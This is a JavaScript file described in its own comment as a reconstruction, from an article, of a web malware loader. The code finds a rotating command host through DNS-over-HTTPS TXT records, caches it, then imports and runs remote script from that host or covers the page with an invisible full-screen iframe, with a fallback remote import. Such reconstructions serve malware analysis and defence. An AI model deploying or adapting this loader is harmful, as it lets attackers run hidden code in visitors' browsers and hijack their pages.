// Reconstructed from the article's loader description; not original source.
const resolvers = ['https://dns.google/resolve',
  'https://cloudflare-dns.com/dns-query', 'https://1.1.1.1/dns-query'];
async function discover() {
  return Promise.any(resolvers.map(async resolver => {
    const response = await fetch(resolver + '?name=_r.rotated.example&type=16',
      {headers: {accept: 'application/dns-json'}});
    const packet = await response.json();
    const answer = packet.Answer.find(record => record.type === 16);
    const host = answer.data.replace(/"/g, '');
    if (!/^[a-z0-9.-]+$/.test(host)) throw new Error('Invalid host');
    return host;
  }));
}
async function boot() {
  const roadPromise = fetch('https://rotated.example/api/road').then(r => r.json());
  const saved = JSON.parse(localStorage.getItem('target') || 'null');
  const targetPromise = saved && Date.now() - saved.at < 60000
    ? Promise.resolve(saved.host) : discover();
  const [road, target] = await Promise.all([roadPromise, targetPromise]);
  localStorage.setItem('target', JSON.stringify({host: target, at: Date.now()}));
  try {
    const ready = await fetch('https://' + target + '/ready');
    if (!ready.ok) throw new Error('Unavailable');
    if (road.mode === 'direct') {
      await import('https://' + target + '/index.js');
    } else {
      const frame = document.createElement('iframe');
      frame.src = 'https://' + target + '/';
      frame.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;border:0;background:transparent;z-index:2147483647';
      document.body.appendChild(frame);
    }
  } catch (error) {
    localStorage.removeItem('target');
    await import('https://' + road.fallback + '/index.js');
  }
}
boot();
